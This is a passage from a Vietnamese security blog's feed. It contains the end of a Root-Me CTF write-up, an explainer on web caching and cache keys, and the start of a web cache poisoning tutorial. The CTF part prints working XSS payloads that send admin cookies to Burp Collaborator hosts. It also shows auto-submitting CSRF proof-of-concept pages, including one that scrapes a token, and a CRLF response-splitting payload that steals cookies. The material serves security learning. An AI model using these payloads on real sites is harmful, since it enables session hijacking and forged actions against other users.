cần điền payload vào phần message và gửi cho admin rồi chờ đợi cho đến khi admin đọc tin nhắn có chứa mã độc.  </p><!-- wp:quote {"className":"is-style-large"} --><blockquote class="wp-block-quote is-style-large"><script>document.write("<img src='<a rel="noreferrer noopener" target="_blank" href="https://lg5eofo3qvqmoh7d59iqtkeoxf35ru.burpcollaborator.net/%22+document.cookie+?fbclid=IwAR2Qjw0GL4j5rKbqMfQmAINqFeQ31C4RLfvz1YFiOZsC2G5djg_7ukUkh34">https://lg5eofo3qvqmoh7d59iqtkeoxf35ru.burpcollaborator.net/"+document.cookie+</a>"'>");</script>Payload  + Burp Collaborator client<p>Khi admin đọc tin nhắn script sẽ được thực thi , cookie sẽ được gửi về:</p> <img src="/images/CTF/image-11.png" class="[class names]" title="[500] [500] " alt=" "><p>Cookie của Admin dùng để pass challenge này !</p><h2>CSRF - 0 protection</h2><h3>Resolution</h3><p>Sau khi tạo tài khoản và đăng nhập vào profile ta sẽ thấy các mục như contact, profile, private. Trong form profile ta có mục update và vs user bình thường sẽ không thực hiện được bởi chỉ có admin ms có quyền tich vào hộp check “status”. Để bypass challenge này cần admin thực hiện update thông tin cho user bằng lỗ hổng csrf.</p><p>Sử dụng Burpsuite để bắt request submit Update và generate csrf poc hoặc  copy từ source rồi chỉnh sửa . Thêm vào đó thẻ input với type là “checkbox” , ô checkbox phải được check, mặc định values=”on”. Tạo function attack() sẽ thực  hiện submit update khi load lại trang.</p><p>Csrf poc:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; &lt;head&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; </span><br><span class="line">&lt;script&gt; function attack() </span><br><span class="line">&#123;document.getElementById(&quot;csrf&quot;).submit()&#125; </span><br><span class="line">&lt;&#x2F;script&gt; </span><br><span class="line">&lt;&#x2F;head&gt; </span><br><span class="line">&lt;body onload&#x3D;&quot;attack()&quot;&gt; </span><br><span class="line">&lt;form id&#x3D;&quot;csrf&quot; action&#x3D;&quot;http:&#x2F;&#x2F;challenge01.root-me.org&#x2F;web-client&#x2F;ch22&#x2F;?action&#x3D;profile&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; </span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;user&quot;&gt; </span><br><span class="line">&lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;status&quot; value&#x3D;&quot;on&quot; checked&gt; </span><br><span class="line">&lt;&#x2F;form&gt; </span><br><span class="line">&lt;&#x2F;body&gt; </span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>Bấy giờ post vào comment rồi submit cho admin, chờ  tầm 1 phút rồi vào mục “Private” để nhận pass.</p><h2>XSS - Reflected</h2><h3>Resolution</h3><p>Ta truyền payload vào param “p” và dùng dấu “ ‘ “ dể đóng ngoặc bởi dấu phẩy kép bị mã hóa.</p><p>Xss thông qua url <a href="http://challenge01.root-me.org/web-client/ch26/?p=prices%27%20onmouseover=%27alert(1)">http://challenge01.root-me.org/web-client/ch26/?p=prices%27%20onmouseover=%27alert(1)</a></p> <img src="/images/CTF/image-12.png" class="[class names]" title="[500] [500] " alt="Thử nghiệm Xss thành công"><p>Sử dụng burp collaborator client<a href="http://challenge01.root-me.org/web-client/ch26/?p=prices%27%20onmouseover=window.location=%27https://ylnjvhj0bm0iuxb6163ydnafu60xom.burpcollaborator.net?%27.concat(document.cookie)%20id=%27">http://challenge01.root-me.org/web-client/ch26/?p=prices%27%20onmouseover=window.location=%27https://ylnjvhj0bm0iuxb6163ydnafu60xom.burpcollaborator.net?%27.concat(document.cookie)%20id=%27</a></p><p>Sau đó report cho Admin và chờ một chút sẽ nhận được flag</p><h2>CSRF - token bypass</h2><h3>Resolution</h3><p>Bài này tương tự cài CSRF 0 Protection nhưng khó hơn một chút bởi nó có sử dụng giá trị “forged-token” để ngăn chặn CSRF. Để có thể lừa admin submit như bài trước ta cần phải có token của admin nhưng điều này là không thể ta cần tìm một token  được sinh ra có thể dùng chung user thường vs admin. Trong mục “search” giá trị “forged-token” chúng ta có thể get và bỏ vào request gửi cho admin thực hiện lừa admin  submit một cách hợp lệ với giá trị “forged-token” đó.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">CSRF POC</span><br><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;!-- CSRF PoC  --&gt;  </span><br><span class="line">&lt;&#x2F;head&gt;  </span><br><span class="line">&lt;body onload&#x3D;&quot;GetToken()&quot;&gt;    </span><br><span class="line">&lt;form id&#x3D;&quot;form-payload&quot; action&#x3D;&quot;?action&#x3D;profile&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;user&quot;&#x2F;&gt;   </span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;status&quot; value&#x3D;&quot;on&quot;&#x2F;&gt;    </span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; id&#x3D;&quot;forged-token&quot; name&#x3D;&quot;token&quot; value&#x3D;&quot;&quot;&#x2F;&gt;   </span><br><span class="line">     &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;go&quot;&#x2F;&gt;  &lt;&#x2F;form&gt;   </span><br><span class="line">      &lt;script&gt;  var x &#x3D; new XMLHttpRequest();  </span><br><span class="line">      function GetToken() &#123;   </span><br><span class="line">           x.open(&quot;GET&quot;,&quot;?action&#x3D;profile&quot;,true);    </span><br><span class="line">           x.send(null);   &#125;  </span><br><span class="line">           x.onreadystatechange &#x3D; function() &#123;    </span><br><span class="line">               if (x.readyState &#x3D;&#x3D; XMLHttpRequest.DONE)</span><br><span class="line">                &#123;      </span><br><span class="line">                    var token &#x3D; x.responseText.match(&#x2F;name&#x3D;&quot;token&quot; value&#x3D;&quot;(.+)&quot;&#x2F;)[1];      </span><br><span class="line">                    document.getElementById(&quot;forged-token&quot;).value &#x3D; token;     </span><br><span class="line">                    document.getElementById(&quot;form-payload&quot;).submit();    &#125;</span><br><span class="line">                    </span><br><span class="line">      &#125;  &lt;&#x2F;script&gt; </span><br><span class="line">&lt;&#x2F;body&gt;  </span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>Submit cho admin và chờ một chút ta sẽ có kết quả.</p><h2>HTTP Response Splitting</h2><h3>Resolution</h3><p>Để vượt qua challenge này ta cần một chút kiến thức về CRLF ( Carriage Return và Line Feed, CR và LF là các ký tự điều khiển, được mã hóa tương ứng 0x0D và 0x0A ). Hai kí tự này là một ký hiệu thể hiện sự kết thúc của response, và một response tiếp theo được bắt đầu, response ban đầu sẽ bị chia tách thành hai và nội dung của response thứ hai sẽ bị điều khiển bởi kẻ tấn công.Kẻ tấn công sau đó có thể tạo một request khác trong cùng một kết nối liên tục, và lừa người nhận (bao gồm cả các yếu tố trung gian) tin rằng response thứ hai này là để trả lời cho request thứ hai.</p> <img src="/images/CTF/image-14.png" class="[class names]" title="[500] [500] " alt="Dấu hiệu CRLF"><p>Chú ý việc đâu tiền cần làm là thêm tiêu đề phản hồi HTTP giả mạo : Content-Length: 0.<br>Điều này khiến trình duyệt web coi đây là phản hồi bị chấm dứt và bắt đầu phân tích một phản hồi mới sau đó là các header còn lại để tạo thành một request hợp lệ.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">%0D%0AContent-%20Length%3A%200 # ngắt response  </span><br><span class="line">%0D%0A # blank </span><br><span class="line">%0D%0AHTTP%2F1.1%20200%20OK # Tạo response mới  </span><br><span class="line">%0D%0AContent-Type%3A%20text%2Fhtml   </span><br><span class="line">%0D%0AX-XSS-Protection%3A%200  </span><br><span class="line">%0D%0ALast-Modified%3A%20Thu%2C%2001%20Jan%202099%2012%3A00%3A00%20GMT%20  </span><br><span class="line">%0D%0AContent-Length%3A%20192  </span><br><span class="line">%0D%0A  </span><br><span class="line">%0D%0%0D%0A%3cscript%3edocument.write%28%3cimg%20src%3dhttps%3a%2f%2fylnjvhj0bm0iuxb6163ydnafu60xom.burpcollaborator.net%3f%22.concat(document.cookie).concat(%22%20%2f%3e%22))%3c%2fscript%3e</span><br></pre></td></tr></table></figure> <p>Submit và chờ kết quá trả về là session của admin.</p><h2>XSS STORED 2</h2><p>Challenge nay cong viec giong voi challenge XSS Store 1 , Nhung diem chu y o day la viec payload khong duoc truyen vao bang input value ma truyen qua http header, va cu the o day la cookie.</p><p>Thu bat request gui message cho admin ve check:</p> <img src="/images/CTF/image-16.png" class="[class names]" title="[500] [500] " alt="Bat request bang burp"><p>Ket qua tra ve la</p> <img src="/images/CTF/image-17.png" class="[class names]" title="[500] [500] " alt="Gia tri cua status duoc lay tu cookie"><p>Gia tri cua cookie “status= invite” da duoc dung de hien thi nguoi gui tin nhan.</p><p> Chen payload va doi admin doc tin nhan thoi!</p><p>Ket hop vs Burp collaborator client</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;document.write(%22&lt;img src&#x3D;http:&#x2F;&#x2F;075lta73ds2oebant1t1ba7s9jf93y.burpcollaborator.net?%22.concat(document.cookie).concat(%22 &#x2F;&gt;%22)) </span><br></pre></td></tr></table></figure><p>Script da duoc thuc thi</p> <img src="/images/CTF/image-18.png" class="[class names]" title="[500] [500] " alt="Tag input bị disable bằng thuộc tính "><p>Cookie nhan duoc dung de bypass challenge nay!!!! </p> <img src="/images/CTF/image-19.png" class="[class names]" title="[500] [500] " alt="Tag input bị disable bằng thuộc tính ">]]></content>
    
    <summary type="html">
    
      
      
         &lt;img src=&quot;/images/CTF/Rootme.jpg&quot; class=&quot;[class names]&quot; title=&quot;[500] [500] &quot; alt=&quot;Root Me&quot;&gt;


&lt;h2&gt;HTML – disabled buttons&lt;/h2&gt;



&lt;h4&gt; **Re
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://blog.hydrasky.ml/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Web Cache &amp; Cache Key</title>
    <link href="http://blog.hydrasky.ml/2020/06/14/Web%20Cache%20&amp;%20Cache%20Key/"/>
    <id>http://blog.hydrasky.ml/2020/06/14/Web Cache &amp; Cache Key/</id>
    <published>2020-06-14T04:00:00.000Z</published>
    <updated>2020-06-14T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2>Web Cache</h2><figure class="wp-block-image"><img src="https://techvccloud.mediacdn.vn/2018/6/18/web-cache-1529296599109108897388.png" alt="Web cache là gì? Tác dụng đối với website? - Ảnh 1."/></figure><h4>ĐỊnh nghĩa</h4><p>Web cache (HTTP cache) là một dứng dụng công nghệ thông tin cho bộ nhớ tạm thời (caching ) để chứa các phản hồi từ hệ thống máy chủ, giúp giảm thiểu dữ liệu cần được truyền qua mạng.</p><figure class="wp-block-image"><img src="https://i.imgur.com/CnTvQBC.png" alt="Pentest Q&A cùng Tsu] #7: Web-Cache Poisoning | Tsu BlogS ٩(^‿^)۶"/></figure><p> Web cache là một vùng nhớ  giữa client và server có nhiệm vụ là lưu trữ bản sao của những tài nguyên web sao cho gần với người dùng, cả về mặt chức năng trong web client hoặc những web caching servers riêng biệt. Tài nguyên đó có thể là :</p><ul><li>Ảnh</li><li>CSS</li><li>Các file HTML tĩnh</li><li>Các file Javascript</li></ul><p> **Tại sao lại cần Caching? ** </p><figure class="wp-block-image"><img src="https://betterexplained.com/wp-content/uploads/compression/HTTP_request.png" alt="Yêu cầu HTTP"/></figure><p>Thử nghĩ khi bạn truy cập vào 1 website bán hàng, trình duyệt sẽ phải load về rất nhiều nội dung như file ảnh, js, html …. Nếu không dùng có cache thì mỗi lần truy cập vào website đó tất cả nội dung sẽ lại phải load lại lần nữa. Như vậy mỗi lần click hay chuyển tag mà băng thông yếu cái chắc “tui nhìn mà tui  tức quá “ chưa kể có nếu như có nhiều người truy cập đến website nữa. </p><figure class="wp-block-image"><img src="https://images.viblo.asia/72dcd966-26ed-46a7-8565-0ba1cb7c59bb.png" alt=""/></figure><p>Lúc này bạn chỉ muốn load thật nhanh còn sysadmin muốn giảm gánh nặng cho máy chủ nên người ta đã dùng cách lưu lại các response các request thường gặp cả ở trên phía máy chủ (Server-side caching) và phía người dùng (Browser caching). Máy chủ sẽ không phải xử lý từng request riêng biệt nữa mà thay vào đó bộ cache sẽ giúp nó gửi trả ngay một response. Một giải pháp khác là bạn mua thêm nhiều máy chủ khác nhưng tất nhiên là bạn sẽ phải có rất nhiều tiền (Và ở đây chúng tôi không làm thees)</p><h4>Nội dung cache được lưu trữ ở đâu? </h4><figure class="wp-block-image"><img src="https://image.slidesharecdn.com/cacheinapigateway-150418032736-conversion-gate01/95/cache-in-api-gateway-18-638.jpg?cb=1429499697" alt=""/></figure><p> <strong>Server-side caching</strong>  </p><p>Người ta thường gọi là Surrogate Cache bởi vì nó hoạt động như Gateway cache . Một  Surrogate Cache là một server lưu các files tĩnh để phục vụ cho việc gửi trả lại các response cho các request phổ biến. Nó sẽ tiếp nhận các request thông thường và nhanh chóng gửi response. Caching proxy sẽ giúp máy chủ chính của bạn không phải xử lý các request này, do đó giảm gánh nặng cho phía server.</p><p> <strong>Browser caching</strong> </p><p>Trình duyệt sẽ phân vùng một lượng nhất định trên ổ cứng của máy tính. Dung lượng này dành để lưu trữ những nội dung bạn đã xem. Hình thức này cho phép truy xuất thông tin khá nhanh do dữ liệu web được lấy trực tiếp từ máy tính người dùng thay vì phải tải lại qua đường truyền mạng và cũng góp phần giảm lưu lượng phía server. Ví dụ trình duyệt lưu một bản sao của một tệp (như hình ảnh logo) và sử dụng bản sao được lưu trong bộ nhớ cache (đã lưu) này trên mỗi trang bạn vào mà cần logo đó.Điều này tránh phải tải xuống hình ảnh một lần nữa và hoàn hảo  phải không?</p><img src="/images/Cache/magento_leverage_browser_caching.png" class="[class names]" title="[500] [500] " alt="Browser caching"><p>Đó lại là vấn đề ! Điều gì xảy ra khi logo công ty thay đổi? SOCOLA =&gt; CORONA</p><p>Bạn sẽ vẫn lướt truy cập vào website đó như thường nhưng bạn sẽ không biết logo của website đã được thay đổi bởi vì cái logo đang xuất hiện trong trình duyệt của bạn là từ browser cache mà ra. Bạn thử nghĩ thay vì 1 cái logo là file js hoặc html điều gì sẽ xảy ra ? . Kệ  m* thôi bởi vì đã có cách khăc phục mà hehe:</p><p>Gateway Cache sẽ lưu các files khác nhau ở những thời điểm khác nhau, nó sẽ quyết định xem files nào nên cache và các files đã được cache có tiếp tục được sử dụng không. Máy chủ báo cho trình duyệt <strong>version</strong> của tệp mà nó đang gửi.Máy chủ sẽ trả về mộtLast-modified - header response cùng với tệp (giả sử là logo.png), như thế này:</p><p>Last-modified: Fri, 16 Mar 2007 04:00:25 GMTFile Contents (could be an image, HTML, CSS, Javascript…)</p><p>Bây giờ trình duyệt biết rằng tệp mà nó nhận được (logo.png) đã được tạo vào ngày 16 tháng 3 năm 2007 và nó sẽ tiếp tục dùng logo từ Browser cache. Lần tiếp theo nếu  trình duyệt cần logo.png, nó sẽ tiếp tục thực hiện kiểm tra đặc biệt với máy chủ:</p><figure class="wp-block-image"><img src="https://betterexplained.com/wp-content/uploads/compression/HTTP-caching-last-modified_1.png" alt="HTTP caching last modified"/></figure><p>Ngoài ra còn một số header response là “Etag” có nhiệm vụ xác thực  nội dung chính xác được lưu trong cache và “Expires , Cache-Control “ để giới hạn thời gian, tránh trình duyệt không giao tiếp với máy chủ giả sử trong trường hợp file không thay đổi một thời gian dài. <a href="https://betterexplained.com/articles/how-to-optimize-your-site-with-http-caching/" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">Chi tiết </a></p><p> <strong>Proxy Cache</strong> </p><p>Ngoài hai nơi lưu trữ cache chính ra , trong một môi trường doanh nghiệp rộng lớn nguời ta còn sử dụng các thiết bị đòng vai trò Web proxy cache làm việc cùng nguyên tắc với browser cache, nhưng ở phương diện rộng lớn hơn. Proxy server đáp ứng hàng trăm hoặc hàng ngàn users cùng một cách thức, những tập đoàn lớn và IPS thường thiết lập chúng trên các firewalls, hoặc như một thiết bị độc lập (thường hiểu như là những phương tiện trung gian). Bởi vì proxy cache không phải là một phần của client hay server chính nên chúng ta không cần phải hiểu rõ. </p><!-- wp:image {"width":590,"height":334} --><figure class="wp-block-image is-resized"><img src="https://cache.digistar.vn/wp-content/uploads/2016/12/cache-2.png" alt="Kết quả hình ảnh cho Proxy Cache" width="590" height="334"/></figure><p>Tiện ở đây có một khái niệm minh muốn giới thiệu là Mạng cung cấp nội dung - Content Delivery Network (CDN), là tập các máy chủ trung gian ( hay còn được gọi là   transparent proxy cache ) được đặt khắp nơi trên thế giới.Hoạt động như một “Gateway” vì vậy mọi request đến mấy chủ trung tâm đều tự động phải đi qua nó , mục đích là giảm thiểu yêu cầu lên máy chủ. Hoạt động như mô hình của Proxy cache . Bạn tưởng tượng xem như Facebook hay Amazon sẽ phải đặt bao nhiêu CDN trên thế giới. Ngoài ra còn các các dịch vụ cho thuê CDN như của cloudFlare, Akamai … .</p><p>Tòm lại việc sử dụng cache rất có lợi cho website của bạn. Không những tối ưu băng thông, tốc độ cho cả người dùng lẫn server , cải thiện việc phân phối nội dung mà còn tăng khả năng bảo mật như chống DOS- DDOS.</p><h2>Cache Key</h2><p>Làm thế nào để web cache nhận diện ra được 2 request là tương tự, là giống nhau và quyết định gửi luôn response cho request  tương tự hay là chuyển lên server lấy new source về.   </p><p>Lập trình viên có thể cài đặt theo cơ chế so sánh byte to byte cho cache. Nhưng cách này kém hiệu quả vì quá trính xảy ra sẽ rất tốn thời gian và tài nguyên ngoài ra trong thành phần của request có nhiều header không ảnh hưởng đến response như “ User-Agent” chẳng hạn.</p><p>Có một cách khác đó chính là sử dụng Cache Key - là sử dụng một số thành phần cụ thể của HTTP request dùng để dùng để xác định resource đang được yêu cầu và các request tương đương . </p><img src="/images/Cache/image-7.png" class="[class names]" title="[500] [500] " alt="Ví dụ Cache key ( Màu cam)"><p>Ngoài ra còn người ta còn sử dụng một header response là “Vary” - dùng để chỉ định những header (ngoại trừ đường dẫn-URL và Host ) nào thêm vào request cần bị khóa lại - để nhận response dúngý sẽ bắt buộc phải có các header được xác thực qua “vary”. Mặc dù header này rất hữu hiệu nhưng nếu sử dụng không chính xác có thể dẫn đến tình trạng tụt tỉ lệ hiệu suất, dữ kiệu chuyển đi bị sai lệch rất là cao nên header này được thiết lập qua loa hay thậm chí không được sử dụng.</p><!-- wp:image {"width":283,"height":148} --><figure class="wp-block-image is-resized"><img src="https://2.bp.blogspot.com/-E_npOkaDOHc/Ur8HBKisJxI/AAAAAAAAAO8/WhdtGvuDwsc/w1200-h630-p-k-no-nu/vary-header-not-working.png" alt="gZip Compression removes pre-existing vary header | Sitecore Tactics" width="283" height="148"/></figure><p><a href="https://www.keycdn.com/support/vary-header" target="_blank" rel="noreferrer noopener" aria-label="Chi tiết tham khảo (opens in a new tab)">Chi tiết tham khảo</a></p><p>Xong như vậy mình đã giới thiệu xong về web cache và cache key! Có gì thắc mặc các bạn có thể để lại comment bên dưới . Thank !</p><p>[UPDATE-10/4/2020]</p><h3>Làm sao để biết được reponse được trả về từ cache ?</h3><p>Một câu hỏi rất hay ! Mình cũng đã đi tìm và câu trả lời của mình lúc này cũng chưa chính thức nha. Theo như mình tìm hiểu sẽ có 2 cách để xác định được response đó từ cache hay trực tiếp từ server .</p><p>Cách đầu tiên đó là dựa vào “status code” HTTP và ở đây là mã “304 Not Modified” - không có sữa đổi. Điều này có nghĩa là tài nguyên được lấy lúc này không có gì thay đVổi và nó sẽ lấy từ cache về thay vì chuyển hướng đến server.</p><figure class="wp-block-image"><img src="https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/images/http-cache-control.png" alt="HTTP Caching | Web Fundamentals | Google Developers"/></figure><p>Cách hai đó chính là dựa vào response header trong response được trả về đó là X-Cache và X-Cache-Lookup header. Thực chất 2 header này không phải là hai chuẩn được quy định trong RFC (Prefix “X”- không phải là chuẩn HTTP Header Field. Nó hay được dùng bởi các CDN và vì vậy các tên gọi của nó cũng có thể được thay đổi theo ý họ.</p><ul><li>"X-Cache" tương ứng với việc proxy có lấy response từ cache hay không (HIT  là có và MISS là không)</li><li>"X-Cache-Lookup"  sẽ nói là proxy có lưu response cho request tương ứng hay không (HIT là có và MISS là không) #Thông thừơng header này ít gặp nên mình cũng không rõ lắm.</li></ul><figure class="wp-block-image"><img src="https://1.bp.blogspot.com/--nwPp96Bsqc/W67uqZ76QPI/AAAAAAAAAHA/oSva9i5E4FsEeFfFa3Fsvjbn1GoeJ4segCLcBGAs/s1600/Screenshot_1.png" alt="Clement Nedelcu's Development Journal: How to fix: Nginx proxy or ..."/><figcaption>Ví dụ</figcaption></figure><p>Ngoài ra còn có các header khác như Age,Etag, exprires, Las-modified, cache-control cũng cho biết các thông tin về việc dữ liệu được lưu trữ trong cache.</p><h4>Link Tham khảo</h4><ul><li><a href="https://betterexplained.com/articles/how-to-optimize-your-site-with-http-caching/">https://betterexplained.com/articles/how-to-optimize-your-site-with-http-caching/</a></li><li><a href="https://vi.wikipedia.org/wiki/Web_caching">https://vi.wikipedia.org/wiki/Web_caching</a></li><li><a href="https://www.freecodecamp.org/news/web-caching-explained-by-buying-milk-at-the-supermarket-2ba6133ca4ed/">https://www.freecodecamp.org/news/web-caching-explained-by-buying-milk-at-the-supermarket-2ba6133ca4ed/</a></li><li><a href="https://viblo.asia/p/nhung-dieu-can-biet-ve-web-cache-Qbq5QJLLKD8">https://viblo.asia/p/nhung-dieu-can-biet-ve-web-cache-Qbq5QJLLKD8</a></li><li><a href="https://docs.microsoft.com/en-us/azure/cdn/cdn-caching-rules">https://docs.microsoft.com/en-us/azure/cdn/cdn-caching-rules</a></li><li>#Response </li><li><a href="https://publicobject.com/2015/03/26/how-do-http-caching-heuristics-work/">https://publicobject.com/2015/03/26/how-do-http-caching-heuristics-work/</a></li><li><a href="https://stackoverflow.com/questions/3027492/x-cache-header-explanation/29772017">https://stackoverflow.com/questions/3027492/x-cache-header-explanation/29772017</a></li><li><a href="https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching">https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;Web Cache&lt;/h2&gt;



&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://techvccloud.mediacdn.vn/2018/6/18/web-cache-1529296599109108897388.pn
      
    
    </summary>
    
    
      <category term="Technology" scheme="http://blog.hydrasky.ml/tags/Technology/"/>
    
  </entry>
  
  <entry>
    <title>Web Cache Poisoning (PART 1)</title>
    <link href="http://blog.hydrasky.ml/2020/06/14/Web%20Cache%20Poisoning%20%20(Part%201)/"/>
    <id>http://blog.hydrasky.ml/2020/06/14/Web Cache Poisoning  (Part 1)/</id>
    <published>2020-06-14T04:00:00.000Z</published>
    <updated>2020-06-14T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>Là một trong những lỗ hổng yêu thích nên mình sẽ viết hơi dài dòng một chút nên phần này mình dành cho những bạn nào mới tìm hiểu nha . Trong phần này mình sẽ giới thiệu về web cache poisoning và yếu tố dẫn đến lỗ hổng cùng mốt số cách khai thác.</p><p>Ngay khi bước vào tìm hiểu về web security chắc chắn sẽ ít ai để ý đến lỗ hổng này. Thậm trí trong các tài liệu và trong các khóa học đề cập rất ít đến nó nên vì thế lúc đầu  mình cũng không quan tâm cho lắm.Khi tìm hiểu về HTTP request Smuggling/ Response Splitting (lỗ hổng mình yêu thích ) thú vị thay mình tìm hiểu được về WCP. Nó rất thú vị như <a href="https://twitter.com/albinowax" target="_blank" rel="noreferrer noopener" aria-label="James Kettle (opens in a new tab)">James Kettle</a> nói !!! </p><p> Đầu tiên, cần phải biết web cache và cache key là gì đã ? Nếu bạn chưa biết bạn có thể tham khảo một <a href="http://hydrasky.ml/2020/03/web-cache">bài viết </a>của mình.</p><h4>Web cache poisoning là gì ?</h4><p>Cứ theo tiếng anh mà dịch thì bạn cx đã hiểu được một phần rồi “Đầu độc web cache”. Bằng cách khai thác một sô vấn đề của máy chủ và lợi dụng cache để phản hồi lại các HTTP reponse có nội dung độc hại từ kẻ tấn công cho người khác.Và đặc biệt lỗ hổng này có thể ảnh hưởng với quy mô rộng  lớn khác với lại các lỗ hổng cùng họ như Web Cache Deception.</p><p>Theo như mình tìm kiếm được , WCP  đã được đề cập trong danh sách lỗ hổng từ năm 2009 của OWASP với một cái tên  “<a rel="noreferrer noopener" aria-label="Cache Poisoning (opens in a new tab)" href="https://owasp.org/www-community/attacks/Cache_Poisoning" target="_blank">Cache Poisoning</a>“ (Nghe rất chung chung bởi còn một số kiểu  cache poisoning khác thì sao như DNS cache poisoning-MITM …) . Điều thú vị nữa là vào thời điểm này người ta cho rằng lỗ hổng này chỉ ở mức “lý thuyết” (theoretical) khó thể khai thác thực tế. Và rồi đến năm 2018 , James Kettle là một chuyên gia, giám đốc mảng Web Security của <a rel="noreferrer noopener" aria-label="Portswigger  (opens in a new tab)" href="https://portswigger.net/about" target="_blank">Portswigger</a> đã có một bài thuyết trình  về lỗ hổng này <a href="https://portswigger.net/research/practical-web-cache-poisoning">Practical Web Cache Poisoning: Redefining ‘Unexploitable’</a> <a href="https://www.youtube.com/watch?v=j2RrmNxJZ5c">[Video]</a> của <a href="https://twitter.com/albinowax">James Kettle</a> trong sự kiện bảo mật thông tin hàng đầu trên thế giới “Blackhat”  và James Kettle đã chững minh cho tất cả thấy rằng Web Cache Poisoning là  “not theoretical “. Các bạn nên xem để hiểu rõ hơn.</p><figure class="wp-block-image"><img src="https://infosec-conferences.com/wp-content/uploads/2019/11/logo-conference-series-blackhat-v1.png" alt=""/><figcaption>Logo của sự kiện BlackHat</figcaption></figure><p>Và mình sẽ phân tích lỗ hổng này dựa vào bài thuyết trình của James Kettle. </p><h4>Một vài điểm lưu ý ở lỗ hổng này ?</h4><p>Xét về tính chất của cache thì ta chia ra làm 2 loại là private cache và pubic (shared) cache. Private cache là cache được lưu trữ phía client (brower cache), được lưu cục bộ  còn public cache là nằm giữa client và server (proxy cache). Với lỗ hổng WCP thì chúng ta chỉ quan tâm  tới việc làm sao đầu độc public cache từ đó tấn công ảnh hưởng đến toàn bộ người dùng cùng proxy cache đó còn Private cache không liên quan.</p><p>Lỗ hổng quan tâm đến <a rel="noreferrer noopener" aria-label="Cache key (opens in a new tab)" href="http://hydrasky.ml/2020/03/web-cache" target="_blank">Cache key</a> , việc attacker xác định được cache key sẽ tăng khả năng bị tấn công. Ví dụ:</p><figure class="wp-block-image"><img src="https://i.imgur.com/wNyvExv.png" alt=""/></figure><p> Cache keys ở đây là phần bôi cam cam ở trên, nếu request nào match 2 cái đó thì resource từ cache sẽ được trả về với nội dung bằng tiếng Anh (en)</p><p>Tương tự như vậy nếu ta request tiếp nhưng thay đổi ngôn ngữ là tiếng Ba Lan: </p><figure class="wp-block-image"><img src="https://i.imgur.com/EbyDbkN.png" alt=""/></figure><p>Cache sẽ so sách cache key và thấy match 2 cái key đó sẽ lại trả nội dung về nhưng không phải là tiếng Ba Lan mà vẫn là tiếng Anh. Trườn hợp nguy hại hơn là một payload độc hại hay một file javascript có chứa lỗ hổng đã được caching cho request trước thì các người dùng sau sẽ đều bị ảnh hưởng cho đến khi một response mới được lưu. Điều đó sẽ có thể dẫn đến lỗ hổng Cache Poisoning. </p><h4>Cách thức tấn công</h4><p> Về cơ bản, Web cache poisoning bao 3 bước. </p><ul><li>Đầu tiên, kẻ tấn công phải tìm ra cách tạo ra response từ máy chủ back-end  bằng cách sử tìm thử các input không phải "cache key".</li><li>Tiếp theo là xem những chỗ input đó có thành lỗi được không.</li><li>Cuối cùng nếu có thì bắt đầu poison shared cache.  </li></ul><p> <strong>Xác định và đánh giá các input không phải key</strong> </p><p> Bất kỳ cuộc tấn công WCP nào đều phụ thuộc vào các input không phải key, chẳng hạn như các tiêu đề (header) . Bộ đệm web bỏ qua các đầu vào không phải key hoặc không bị khóa khi quyết định có nên trả về response được lưu trong bộ nhớ cache cho người dùng hay không. Điều có nghĩa là bạn có thể sử dụng các đầu vào không bị khóa để gửi payload của mình và tạo ra response bị “poisoned”, nếu được lưu trong bộ nhớ cache, sẽ được trả về cho tất cả người dùng có yêu cầu có khóa bộ đệm tương ứng. Do đó, bước đầu 